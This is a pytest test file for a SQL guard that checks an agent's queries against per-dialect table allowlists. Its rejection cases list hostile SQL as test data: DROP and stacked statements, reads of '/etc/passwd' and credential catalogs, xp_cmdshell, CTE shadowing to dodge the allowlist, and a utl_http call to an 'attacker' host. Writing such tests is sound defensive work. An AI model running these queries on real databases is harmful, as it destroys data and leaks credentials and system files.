import pytest

from bizagent.security.guard import UnsafeSQLError, check_select

PG = {"dialect": "postgres", "allowed_tables": ["dwh.*"], "default_schema": "dwh"}


def test_simple_select_ok():
    q = check_select("SELECT SUM(amount) FROM fact_sales WHERE d >= '2026-01-01'", **PG)
    assert q.tables == ("dwh.fact_sales",)


def test_cte_and_join_ok():
    sql = """WITH t AS (SELECT store_id, SUM(amount) a FROM dwh.fact_sales GROUP BY 1)
             SELECT s.name, t.a FROM t JOIN dwh.dim_store s ON s.id = t.store_id"""
    q = check_select(sql, **PG)
    assert set(q.tables) == {"dwh.fact_sales", "dwh.dim_store"}


@pytest.mark.parametrize(
    "sql",
    [
        "DELETE FROM dwh.fact_sales",
        "UPDATE dwh.fact_sales SET amount = 0",
        "INSERT INTO dwh.x VALUES (1)",
        "DROP TABLE dwh.fact_sales",
        "SELECT 1; DROP TABLE dwh.fact_sales",
        "SELECT * INTO dwh.copy FROM dwh.fact_sales",
        "SELECT pg_sleep(10)",
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT * FROM public.users",
        "SELECT * FROM pg_catalog.pg_authid",
        "SELECT * FROM otherdb.dwh.fact_sales",
        "",
    ],
)
def test_postgres_rejects(sql):
    with pytest.raises(UnsafeSQLError):
        check_select(sql, **PG)


def test_mysql_dialect():
    kw = {"dialect": "mysql", "allowed_tables": ["shop.*"], "default_schema": "shop"}
    assert check_select("SELECT `name` FROM orders LIMIT 5", **kw).tables == ("shop.orders",)
    for bad in ("SELECT SLEEP(5)", "SELECT LOAD_FILE('/etc/passwd')", "SELECT * FROM mysql.user"):
        with pytest.raises(UnsafeSQLError):
            check_select(bad, **kw)


def test_tsql_dialect():
    kw = {"dialect": "tsql", "allowed_tables": ["dbo.*"], "default_schema": "dbo"}
    assert check_select("SELECT TOP 10 * FROM [dbo].[Orders]", **kw).tables == ("dbo.Orders",)
    for bad in (
        "SELECT * FROM OPENROWSET('SQLNCLI', 'x', 'SELECT 1')",
        "EXEC xp_cmdshell 'dir'",
        "SELECT * FROM master.dbo.sysdatabases",
    ):
        with pytest.raises(UnsafeSQLError):
            check_select(bad, **kw)


def test_sqlite_dialect():
    kw = {"dialect": "sqlite", "allowed_tables": ["main.*"], "default_schema": "main"}
    assert check_select("SELECT strftime('%Y-%m', order_date) FROM orders", **kw).tables == ("main.orders",)
    for bad in ("PRAGMA query_only = OFF", "ATTACH DATABASE 'x.db' AS x", "SELECT load_extension('x')"):
        with pytest.raises(UnsafeSQLError):
            check_select(bad, **kw)


def test_duckdb_dialect():
    kw = {"dialect": "duckdb", "allowed_tables": ["main.*"], "default_schema": "main"}
    assert check_select("SELECT date_trunc('month', ngay), SUM(x) FROM t GROUP BY 1", **kw).tables == ("main.t",)
    for bad in (
        "SELECT * FROM read_csv('/etc/passwd')",
        "SELECT * FROM 'data.parquet'",
        "SELECT * FROM query('DROP TABLE t')",
        "INSTALL httpfs",
        "ATTACH 'x.db'",
        "COPY t TO 'out.csv'",
    ):
        with pytest.raises(UnsafeSQLError):
            check_select(bad, **kw)


@pytest.mark.parametrize("sql", [
    # CTE trùng tên bảng: bảng bên trong là bảng THẬT, không được coi là CTE để né allowlist
    "WITH users AS (SELECT * FROM public.users) SELECT * FROM users",
    "WITH users AS (SELECT * FROM users) SELECT * FROM users",
    "SELECT * FROM (WITH users AS (SELECT 1 AS a) SELECT * FROM users) x CROSS JOIN users",
    "WITH a AS (SELECT * FROM users), users AS (SELECT 1 AS x) SELECT * FROM a",
    # hàm nguy hiểm không có trong danh sách tên đơn lẻ, chặn theo tiền tố
    "SELECT pg_sleep_for('5 minutes')",
    "SELECT lo_get(1234)",
    "SELECT pg_read_server_files('/etc/passwd')",
    "SELECT utl_http.request('http://attacker') FROM dwh.fact_sales",
])
def test_cte_shadowing_and_function_prefixes_rejected(sql):
    with pytest.raises(UnsafeSQLError):          # chỉ được đọc fact_sales; "users" là bảng bị cấm
        check_select(sql, dialect="postgres", allowed_tables=["dwh.fact_sales"], default_schema="dwh")


def test_legit_ctes_still_ok():
    check_select("WITH RECURSIVE r AS (SELECT 1 AS n UNION ALL SELECT n + 1 FROM r WHERE n < 3) SELECT * FROM r", **PG)
    check_select("WITH b AS (SELECT 1 AS x), a AS (SELECT * FROM b) SELECT * FROM a", **PG)
    q = check_select("WITH t AS (SELECT * FROM fact_sales) SELECT * FROM t AS x JOIN t AS y ON x.id = y.id", **PG)
    assert q.tables == ("dwh.fact_sales",)


def test_specific_table_allowlist():
    kw = {"dialect": "postgres", "allowed_tables": ["public.orders"], "default_schema": "public"}
    check_select("SELECT * FROM orders", **kw)
    with pytest.raises(UnsafeSQLError):
        check_select("SELECT * FROM customers", **kw)
